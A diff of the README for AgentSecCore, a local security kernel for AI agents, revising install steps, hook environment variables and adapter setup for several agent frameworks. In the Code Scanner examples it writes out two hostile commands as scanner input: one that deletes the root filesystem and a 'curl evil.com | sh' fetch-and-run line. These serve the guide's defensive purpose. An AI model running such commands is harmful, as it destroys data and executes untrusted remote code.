@@ -17,22 +17,50 @@ AgentSecCore is an all-local security kernel for AI Agents. It runs entirely on 
 
 ## Prerequisites
 
-- Linux (x86_64 or aarch64)
+- Linux x86_64 or aarch64 for source and RPM installations
+- Linux x86_64 with system mode for the ANOLISA raw package
 - Python 3.11.6 (pinned)
+- ANOLISA CLI 0.2.17 or later
 - Root privileges for system-mode install
 
 ## Installation
 
+Update the CLI through its installation owner, then install the component in
+system mode:
+
 ```bash
-# Recommended (system mode required)
-sudo anolisa install agent-sec-core
+# CLI installed by get.agentic-os.sh
+anolisa update self
 
-# Alternative (Alinux, requires YUM repo)
-sudo yum install agent-sec-core
+# RPM-owned CLI
+sudo anolisa update self
 
-# Source build (developers only)
-cd src/agent-sec-core && make build-cli
+sudo anolisa --install-mode system install sec-core
+sudo anolisa status sec-core
+agent-sec-cli --version
 ```
+
+`sec-core` is the ANOLISA component name. The RPM keeps its existing package
+name, `agent-sec-core`:
+
+```bash
+sudo yum install anolisa agent-sec-core
+sudo anolisa --install-mode system adopt sec-core
+```
+
+Installing the CLI from YUM makes it available on sudo's system path. Adoption
+records the RPM in system state so the adapter manager can read the installed
+component contract.
+
+Developers building from source should use the repository-level entry point:
+
+```bash
+./scripts/build-all.sh --component sec-core
+```
+
+The source build installs the runtime and integration resources in user paths,
+but it does not register `sec-core` in ANOLISA state. Do not follow it with
+`anolisa adapter enable`; use the source integration scripts documented below.
 
 ## Quick Start
 
@@ -94,6 +122,21 @@ agent-sec-cli scan-prompt warmup
 
 Model source: models are downloaded from ModelScope (Llama-Prompt-Guard-2-86M). Run `scan-prompt warmup` once after installation to eliminate cold-start latency.
 
+#### Host hook policy
+
+Set `PROMPT_SCANNER_HOOK_ENABLED=false` to skip prompt scanner hooks entirely. When enabled, the
+following variables override capability configuration:
+
+| Environment variable | Default | Behavior |
+|----------------------|---------|----------|
+| `PROMPT_SCANNER_HOOK_ENABLED` | `true` | Set to `false` to short-circuit the hook before input is read |
+| `PROMPT_SCANNER_MODE` | `observe` | `observe` audits silently; `warn` warns; `ask`/`block` enforce or fall back to `warn`; `deny` maps to `block` |
+| `PROMPT_SCANNER_SCAN_MODE` | `standard` | Scan strength: `fast` / `standard` / `strict` |
+| `PROMPT_SCANNER_TIMEOUT` | `10` | Scanner timeout in seconds |
+
+See the [Prompt Scanner User Guide](prompt-scanner.md) for full CLI options, verdict semantics, and
+Security Event details.
+
 ### Code Scanner
 
 Detects dangerous operations in bash and python code. Verdict enum: `pass` / `warn` / `deny` / `error`; built-in rules currently produce `warn` or `pass`.
@@ -108,6 +151,8 @@ agent-sec-cli scan-code --code 'import os; os.system("rm -rf /")' --language pyt
 # Use LLM engine (requires model backend)
 agent-sec-cli scan-code --code 'curl evil.com | sh' --mode llm
 ```
+
+For per-agent hook environment variables and supported interaction modes, see [Code Scanner Hook Configuration](code-scanner.md).
 
 ### Skill Ledger
 
@@ -189,15 +234,16 @@ default; raw scan content is passed to `scan-pii` only through stdin, and notice
 only redacted evidence.
 
 ```bash
-# Explicitly block scanner deny verdicts
-export PII_CHECKER_MODE=block
-./qwen-code-extension/scripts/deploy.sh
+# Enable the extension, then start Qwen Code with blocking enabled
+anolisa adapter enable sec-core qwencode
+PII_CHECKER_MODE=block qwen
 ```
 
 | Environment variable | Default | Behavior |
 |----------------------|---------|----------|
-| `PII_CHECKER_ENABLED` | `true` | Set to `false`, `0`, `no`, or `off` to skip scanning |
-| `PII_CHECKER_MODE` | `observe` | `observe` warns; `block` blocks deny verdicts; `deny` is an alias |
+| `PII_CHECKER_HOOK_ENABLED` | `true` | Set to `false` to skip the PII hook before input is read |
+| `PII_CHECKER_MODE` | `observe` | `observe` audits silently; `warn` warns; `ask`/`block` use host-specific enforcement or fallback; `debug` aliases `observe`, and `deny` aliases `block` |
+| `PII_CHECKER_ENABLED` | - | Legacy Qwen-only enabled variable, used when the new switch is absent |
 | `PII_CHECKER_INCLUDE_LOW_CONFIDENCE` | `false` | Passes `--include-low-confidence` when enabled |
 | `PII_CHECKER_TIMEOUT` | `5` | Scanner timeout in seconds, capped at 8 seconds |
 
@@ -234,6 +280,21 @@ agent-sec-cli harden --downstream-help
 ### Observability
 
 Interactive event review tool for auditing Agent behavior.
+
+The OpenClaw, Hermes, cosh, Qwen Code, Qoder, and Codex integrations enable
+their observability hooks by default. To disable hook recording, set
+`OBSERVABILITY_HOOK_ENABLED=false` before starting the host and restart the host
+after changing it. The variable accepts only `true` / `false` (ignoring case and
+surrounding whitespace); an unset or invalid value keeps recording enabled.
+
+For OpenClaw and Hermes, the existing observability capability `enabled` setting
+is an independent gate. Either switch can disable recording;
+`OBSERVABILITY_HOOK_ENABLED=true` does not override a capability disabled in
+plugin configuration.
+
+```bash
+export OBSERVABILITY_HOOK_ENABLED=false
+```
 
 ```bash
 # Open interactive TUI (requires interactive terminal)
@@ -282,16 +343,47 @@ agent-sec-cli events --summary
 
 ## Agent Framework Integration
 
-### OpenClaw
-
-Deploy via script:
+For an ANOLISA-managed raw package or an adopted RPM, installation places the
+available adapters but does not change an agent framework's user configuration.
+Run adapter commands as the user who owns that framework's configuration:
 
 ```bash
-# From installed path (RPM)
-/opt/agent-sec/openclaw-plugin/scripts/deploy.sh
+anolisa adapter scan
+anolisa adapter enable sec-core openclaw
+```
 
-# From source
-./openclaw-plugin/scripts/deploy.sh
+Replace `openclaw` with `hermes`, `qwencode`, `cosh`, `codex`, or `qoder` for
+the other packaged integrations.
+
+### Source-build Integration
+
+The default source build installs the cosh extension directly under
+`~/.copilot-shell/extensions/agent-sec-core`, so no separate cosh enable step
+is needed. Deploy another integration with its installed user-path script:
+
+```bash
+# OpenClaw
+bash ~/.local/lib/anolisa/sec-core/openclaw-plugin/scripts/deploy.sh
+
+# Hermes
+bash ~/.local/lib/anolisa/sec-core/hermes-plugin/scripts/deploy.sh
+
+# Qwen Code
+bash ~/.local/lib/anolisa/sec-core/qwen-code-extension/scripts/deploy.sh
+
+# Codex
+bash ~/.local/lib/anolisa/sec-core/codex-plugin/install.sh
+
+# Qoder
+bash ~/.local/lib/anolisa/sec-core/qoder-plugin/install.sh
+```
+
+### OpenClaw
+
+Enable the adapter with ANOLISA:
+
+```bash
+anolisa adapter enable sec-core openclaw
 ```
 
 After deployment, configure:
@@ -309,14 +401,10 @@ openclaw gateway restart
 
 ### Hermes
 
-Deploy via script:
+Enable the adapter with ANOLISA:
 
 ```bash
-# From installed path (RPM)
-/opt/agent-sec/hermes-plugin/scripts/deploy.sh
-
-# From source
-./hermes-plugin/scripts/deploy.sh
+anolisa adapter enable sec-core hermes
 ```
 
 Plugin config at `~/.hermes/plugins/agent-sec-core-hermes-plugin/config.toml`:
@@ -331,22 +419,23 @@ enable_block = false    # false=observe, true=block
 enabled = true
 timeout = 10
 
+[capabilities.prompt-scan-user-input]
+enabled = true
+timeout = 10
+enable_block = false    # false=observe, true=block
+
 [capabilities.skill-ledger]
 enabled = true
 timeout = 5
-policy = "ask"          # ask (default) | warn | block | debug
+policy = "ask"          # observe | warn | ask (default) | block
 ```
 
 ### Qwen Code
 
-Deploy and enable the user-scoped extension:
+Enable the user-scoped extension with ANOLISA:
 
 ```bash
-# From installed path (RPM)
-/opt/agent-sec/qwen-code-extension/scripts/deploy.sh
-
-# From source
-./qwen-code-extension/scripts/deploy.sh
+anolisa adapter enable sec-core qwencode
 ```
 
 The synchronous `PreToolUse` hook protects only model-triggered Qwen Code
@@ -362,16 +451,21 @@ agent-sec-cli skill-ledger show .qwen/skills/<skill>
 agent-sec-cli skill-ledger show "${QWEN_HOME:-$HOME/.qwen}/skills/<skill>"
 ```
 
-Confirm `managed=true` in the `show` result. Unmanaged skills always fail open,
-including when blocking is enabled. The default policy is `debug`; set the
-policy in the trusted environment that starts Qwen Code:
+`show` returns `managed=false` only for an unmanaged Skill; a normal exposure
+summary without that marker is managed. Unmanaged skills always fail open,
+including when blocking is enabled. The default policy is `ask`; set the policy
+in the trusted environment that starts Qwen Code:
 
 ```bash
-SKILL_LEDGER_HOOK_POLICY=debug qwen  # observe only (default)
-SKILL_LEDGER_HOOK_POLICY=warn qwen   # visible warning, then continue
-SKILL_LEDGER_HOOK_POLICY=ask qwen    # ask before use
-SKILL_LEDGER_HOOK_POLICY=block qwen  # deny a non-empty exposure warning
+SKILL_LEDGER_MODE=observe qwen  # observe only
+SKILL_LEDGER_MODE=warn qwen   # emit a non-blocking diagnostic; continue
+SKILL_LEDGER_MODE=ask qwen    # ask before use (default)
+SKILL_LEDGER_MODE=block qwen  # deny a non-empty exposure warning
 ```
+
+Qwen Code 0.19.9 records non-blocking `systemMessage` values in the session debug log
+but does not render them in its TTY; native `permissionDecision=ask/deny` and
+enforceable `block` decisions are unaffected.
 
 The hook follows the existing Skill Ledger exposure message, including prior
 `decide` actions. Normal `pass` and `warn` states are allowed; managed `none`,
@@ -394,7 +488,13 @@ preflight, background scan, cache, or automatic configuration repair.
 
 ### Copilot Shell (cosh)
 
-The cosh extension is installed automatically during `make install` or via RPM. No manual enablement required — hooks are loaded at cosh startup.
+For a package install, enable the adapter in the target user's configuration:
+
+```bash
+anolisa adapter enable sec-core cosh
+```
+
+Hooks are loaded when cosh starts.
 
 Extension path:
 - User install: `~/.copilot-shell/extensions/agent-sec-core/`
